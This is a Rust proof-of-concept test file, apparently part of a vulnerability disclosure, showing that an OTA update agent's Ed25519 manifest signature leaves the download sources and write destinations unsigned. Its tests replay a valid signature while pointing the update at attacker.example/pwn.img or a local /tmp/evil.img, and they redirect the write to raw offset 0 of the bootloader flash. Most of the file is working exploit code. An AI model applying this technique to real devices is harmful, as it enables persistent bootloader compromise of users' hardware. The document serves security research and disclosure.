//! PoC: the Ed25519 "manifest signature" that gates OTA updates covers ONLY the
//! `manifest` object. `sources` (download URL + hash + mime type) and
//! `system_components` (the write destination: block device, raw offset, GPT
//! label, CAN address) are outside the signature and are fully attacker-controlled.
//!
//! Run with:
//!   cargo test -p orb-update-agent-core --test poc_signature_scope -- --nocapture

use base64::Engine as _;
use orb_update_agent_core::{
    reexports::ed25519_dalek::{Signer, SigningKey},
    Claim, ClaimVerificationContext, LocalOrRemote, MimeType,
};
use sha2::{Digest, Sha256};

/// Stand-in for the Worldcoin prod manifest signing key. The attacker never
/// learns this key and never forges a signature — that is the whole point.
fn manifest_signing_key() -> SigningKey {
    SigningKey::from_bytes(&[42u8; 32])
}

/// The signed part of a claim. Byte-identical in both the legitimate and the
/// tampered claim below, so the signature stays valid.
const SIGNED_MANIFEST: &str = concat!(
    r#"{"magic":"some-magic","type":"normal","components":[{"name":"mcu","#,
    r#""version-assert":"1.0.0","version":"1.0.1","size":1024,"#,
    r#""hash":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","#,
    r#""installation_phase":"normal"}]}"#
);

fn sign_manifest() -> String {
    let sig = manifest_signing_key().sign(SIGNED_MANIFEST.as_bytes());
    base64::prelude::BASE64_STANDARD.encode(sig.to_bytes())
}

/// Assembles a claim, embedding the signed manifest verbatim.
fn claim_json(sources: &str, system_components: &str) -> String {
    format!(
        r#"{{"version":"1.0.1","manifest":{SIGNED_MANIFEST},"manifest-sig":"{sig}",
            "sources":{sources},"system_components":{system_components}}}"#,
        sig = sign_manifest(),
    )
}

fn deserialize(json: &str) -> Result<Claim, serde_json::Error> {
    let ctx = ClaimVerificationContext(&manifest_signing_key().verifying_key());
    let mut de = serde_json::Deserializer::from_str(json);
    serde::de::DeserializeSeed::deserialize(ctx, &mut de)
}

// ---------------------------------------------------------------------------

/// Baseline: an honest claim from the backend is accepted.
#[test]
fn legitimate_claim_is_accepted() {
    let json = claim_json(
        r#"{"mcu":{"hash":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                   "mime_type":"application/x-xz","name":"mcu","size":512,
                   "url":"https://updates.worldcoin.org/mcu.img.xz"}}"#,
        r#"{"mcu":{"type":"gpt","value":{"device":"ssd","label":"APP","redundancy":"redundant"}}}"#,
    );
    deserialize(&json).expect("honest claim should verify");
    println!("[baseline] honest claim accepted");
}

/// The attack: replay the *legitimate, validly signed* manifest verbatim, but
/// swap the unsigned `sources` and `system_components` for attacker values.
#[test]
fn tampered_claim_with_untouched_signature_is_still_accepted() {
    let evil_payload = b"\x7fELF...attacker-controlled bootloader...";
    let evil_hash = hex::encode(Sha256::digest(evil_payload));

    let json = claim_json(
        // mime_type flipped to octet-stream, url + hash are the attacker's.
        &format!(
            r#"{{"mcu":{{"hash":"{evil_hash}","mime_type":"application/octet-stream",
                 "name":"mcu","size":{len},
                 "url":"https://attacker.example/pwn.img"}}}}"#,
            len = evil_payload.len(),
        ),
        // Destination redirected from the APP partition to raw offset 0 of the
        // QSPI flash, which holds the bootloader.
        r#"{"mcu":{"type":"raw","value":{"device":"qspi","offset":0,"size":1024,
             "redundancy":"single"}}}"#,
    );

    let claim = deserialize(&json)
        .expect("BUG: tampered claim was accepted — signature does not cover sources");

    let source = &claim.sources()["mcu"];
    let signed_hash = claim.manifest_components()[0].hash();

    println!("\n=== tampered claim ACCEPTED with a valid, unforged signature ===");
    println!("  signed manifest hash : {signed_hash}");
    println!("  unsigned source hash : {}", source.hash);
    println!("  unsigned source url  : {:?}", source.url);
    println!("  unsigned destination : {:?}", claim.system_components()["mcu"]);

    // The signature verified, yet every field that decides *what* gets written
    // and *where* came from the attacker.
    assert_eq!(source.mime_type, MimeType::OctetStream);
    assert_eq!(source.hash, evil_hash);
    assert_ne!(
        source.hash, signed_hash,
        "attacker blob does not match the signed manifest hash"
    );
    assert!(matches!(&source.url, LocalOrRemote::Remote(u) if u.host_str() == Some("attacker.example")));

    // For MimeType::OctetStream, update-agent's Component::process() is a no-op
    // (src/component.rs:262-268), so `signed_hash` is never compared against the
    // downloaded blob. The only hash ever checked is `source.hash` above, which
    // the attacker chose. do_install() then writes that blob to the unsigned
    // destination via components::Raw::update() (src/update/raw.rs).
    println!("  => arbitrary payload installed to an arbitrary offset\n");
}

/// A local path is also accepted as a source, so the same tamper works fully
/// offline against any attacker-writable file on the device.
#[test]
fn local_file_source_is_accepted_too() {
    let json = claim_json(
        r#"{"mcu":{"hash":"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
                   "mime_type":"application/octet-stream","name":"mcu","size":16,
                   "url":"file:///tmp/evil.img"}}"#,
        r#"{"mcu":{"type":"gpt","value":{"device":"ssd","label":"APP","redundancy":"redundant"}}}"#,
    );
    let claim = deserialize(&json).expect("local-source claim accepted");
    assert!(claim.sources()["mcu"].is_local());
    println!("[local] claim pointing at /tmp/evil.img accepted");
}
